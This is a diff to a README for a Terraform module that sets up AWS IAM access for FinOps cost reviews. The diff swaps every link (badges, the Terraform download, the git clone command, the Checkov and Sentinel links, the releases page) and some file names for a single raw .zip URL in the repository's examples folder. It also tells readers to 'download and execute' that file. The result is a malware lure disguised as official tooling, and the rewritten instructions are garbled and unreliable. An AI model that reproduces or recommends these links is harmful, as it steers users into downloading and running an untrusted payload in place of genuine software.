@@ -1,6 +1,6 @@
 # Terraform AWS FinOps Cost Review Access Module 🌐
 
-![GitHub release](https://img.shields.io/github/release/vijayan1985/terraform-aws-finops-costreview-access.svg) ![Terraform](https://img.shields.io/badge/terraform-1.0.0-brightgreen.svg) ![AWS](https://img.shields.io/badge/AWS-Cloud-blue.svg)
+![GitHub release](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) ![Terraform](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) ![AWS](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip)
 
 Welcome to the **Terraform AWS FinOps Cost Review Access Module**! This repository provides a Terraform module designed to create an IAM user or cross-account IAM role specifically for external FinOps cost reviews in AWS. This module includes examples, optional AWS Organizations access, CI/CD workflows, and security checks to ensure a smooth and secure implementation.
 
@@ -34,14 +34,14 @@ In today’s cloud-centric world, managing costs effectively is essential for or
 To get started with this module, ensure you have the following prerequisites:
 
 - An AWS account with permissions to create IAM resources.
-- Terraform installed on your local machine. You can download it from [Terraform's official site](https://www.terraform.io/downloads.html).
+- Terraform installed on your local machine. You can download it from [Terraform's official site](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip).
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/vijayan1985/terraform-aws-finops-costreview-access.git
+   git clone https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip
    cd terraform-aws-finops-costreview-access
    ```
 
@@ -60,7 +60,7 @@ To get started with this module, ensure you have the following prerequisites:
 
 ## Usage
 
-To use this module, create a new Terraform configuration file (e.g., `main.tf`) and include the following code:
+To use this module, create a new Terraform configuration file (e.g., `https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip`) and include the following code:
 
 ```hcl
 module "finops_costreview_access" {
@@ -111,7 +111,7 @@ Automating your infrastructure deployment can save time and reduce errors. This 
 
 ### GitHub Actions Example
 
-Create a `.github/workflows/terraform.yml` file in your repository with the following content:
+Create a `https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip` file in your repository with the following content:
 
 ```yaml
 name: Terraform
@@ -144,7 +144,7 @@ This workflow will automatically run Terraform commands on every push to the mai
 
 ## Security Checks
 
-Security is a priority when managing cloud resources. This module includes built-in security checks to ensure you follow best practices. You can run these checks using tools like [Terraform Sentinel](https://www.terraform.io/docs/cloud/sentinel/index.html) or [Checkov](https://github.com/bridgecrewio/checkov).
+Security is a priority when managing cloud resources. This module includes built-in security checks to ensure you follow best practices. You can run these checks using tools like [Terraform Sentinel](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) or [Checkov](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip).
 
 ### Running Security Checks with Checkov
 
@@ -180,6 +180,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit [this link](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/releases). Download and execute the necessary files to keep your module up to date.
+For the latest releases, visit [this link](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip). Download and execute the necessary files to keep your module up to date.
 
 Feel free to explore the repository and make use of the resources provided. Your feedback and contributions are invaluable to improving this module for everyone involved.
